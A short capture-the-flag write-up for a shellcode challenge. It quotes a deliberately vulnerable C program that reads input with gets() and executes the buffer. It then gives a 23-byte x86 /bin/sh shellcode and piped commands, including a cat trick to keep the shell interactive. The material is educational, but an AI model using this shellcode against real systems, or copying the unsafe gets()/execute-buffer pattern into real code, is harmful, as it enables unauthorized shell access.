This is the first challenge that may need some work. 
The vlun.c program read an input to a buffer `buf` then call it as a function `((void(*)())buf)()`.
To exploit this vlunerability we need to provide input as a shellcode ( a code that's already in machine language), 
because CPU will access it directly.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}

```

The shellcode can be for any desire command but for this challenge it asks for shell, so we will search for a shellcode and provide
it as an input. 

This is a 23 bytes shellcode from shell-strom by Hamza Megahed [here](http://shell-storm.org/shellcode/files/shellcode-827.php).
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
$ python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'|.vuln
or 
$ python -c 'import pwn; print(pwn.shellcraft.linux.sh())'|.vlun
```

We can see that the shell has been invoked but inside vlun, and we lost the interaction with it. 
So we need to keep the interaction with it, John Hammond did that using cat [here](https://www.youtube.com/watch?v=Nn0fUJuQEsk&list=PL1H1sBF1VAKUmJio8DWjY0tHLwf3bl2ku&index=6). 
```
$ (python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")';cat)|./vuln
```
simply then cat the flag.txt.
